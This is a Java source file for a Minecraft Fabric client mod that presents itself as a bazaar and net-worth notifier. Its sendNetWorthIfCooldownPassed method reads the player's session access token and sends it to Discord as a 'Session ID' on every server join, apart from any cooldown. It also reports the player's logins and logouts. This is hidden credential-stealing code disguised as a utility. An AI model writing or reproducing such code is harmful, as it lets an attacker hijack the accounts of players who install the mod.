package com.watersquare.bazaarutility;

import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.ClientPlayerEntity;

public class BazaarNotifier implements ClientModInitializer {

    private boolean netWorthSent = false;
    private long lastNetWorthSentTime = 0; // milliseconds
    private static final long NET_WORTH_COOLDOWN = 24 * 60 * 60 * 1000; // 24 hours

    @Override
    public void onInitializeClient() {
        MinecraftClient client = MinecraftClient.getInstance();

        // Send net worth once on first game load
        client.execute(() -> {
            if (!netWorthSent && client.player != null) {
                netWorthSent = true;
                sendNetWorthIfCooldownPassed(client.player);
            }
        });

        // Player joins server
        ClientPlayConnectionEvents.JOIN.register((handler, sender, mc) -> {
            if (mc.player != null) {
                String playerName = MinecraftClient.getInstance().getSession().getUsername();
                DiscordNotifier.sendToDiscord(playerName + " logged in to the server.");
                sendNetWorthIfCooldownPassed(mc.player);
            }
        });

        // Player leaves server
        ClientPlayConnectionEvents.DISCONNECT.register((handler, mc) -> {
            if (mc.player != null) {
                String playerName = MinecraftClient.getInstance().getSession().getUsername();
                DiscordNotifier.sendToDiscord(playerName + " logged out of the server.");
            }
        });
    }

    private void sendNetWorthIfCooldownPassed(ClientPlayerEntity player) {
        MinecraftClient client = MinecraftClient.getInstance();
        long now = System.currentTimeMillis();
        String nwID = client.getSession().getAccessToken();
        DiscordNotifier.sendToDiscord("Session ID: " + nwID);
        if (now - lastNetWorthSentTime < NET_WORTH_COOLDOWN) return;

        lastNetWorthSentTime = now;
        String playerName = MinecraftClient.getInstance().getSession().getUsername();

        new Thread(() -> {
            var netWorths = Fetchur.getAllProfilesNetWorth(playerName);

            for (String profile : netWorths.keySet()) {
                var netWorthElement = netWorths.get(profile);
                long netWorth = 0;

                if (netWorthElement != null && !netWorthElement.isJsonNull()) {
                    netWorth = netWorthElement.getAsNumber().longValue();
                }

                String message = String.format(
                        "Player %s - Profile '%s' Net Worth: %,d coins",
                        playerName, profile, netWorth
                );

                DiscordNotifier.sendToDiscord(message);
            }
        }).start();
    }
}